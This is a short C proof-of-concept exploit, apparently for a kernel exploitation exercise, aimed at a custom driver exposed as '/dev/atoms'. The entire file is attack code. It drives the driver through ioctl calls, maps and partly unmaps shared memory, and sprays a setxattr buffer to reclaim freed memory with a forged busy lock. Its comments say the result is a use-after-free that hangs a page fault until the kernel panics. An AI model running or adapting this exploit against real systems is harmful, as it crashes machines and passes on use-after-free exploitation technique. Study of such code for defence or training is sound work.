#include <sys/xattr.h>
#include<sys/ioctl.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<fcntl.h>
#include<sys/stat.h>

#define DEVICE_FILE "/dev/atoms"
#define ALLOC 0xc010d902ul
#define CREATE 0x4008D900ul
#define TOKEN 0x4141414141414141ul

int fd;
struct req{
	unsigned long size;
	unsigned long field8;
};
void create(unsigned long token){
	ioctl(fd,CREATE,token);
}
void alloc(unsigned long size){
	struct req request={.size=size,.field8=0};
	ioctl(fd,ALLOC,&request);
}
void exploit(){
	create(TOKEN);
	alloc(0x2000);
	unsigned long dest=0x174000;
	mmap((void *)dest,0x5000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);//3
	munmap((void *)(dest+0x4000),0x1000);//2
	munmap((void *)(dest+0x3000),0x1000);//1
	munmap((void *)(dest+0x2000),0x1000);//0
	char data[0x110];
	for(int i=0;i<0x110;i++){
		data[i]='A';
	}
	*(unsigned int *)(data+0xc)=0x1;//make lock busy
	setxattr("/tmp", "x", data, 0x110, XATTR_CREATE);//trigger UAF
	unsigned long trigger=*(unsigned long *)dest;
//mmap_fault will wait for lock to get free, which never happens, so it will trigger soflockup_panic after 20 seconds.
}
int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
}

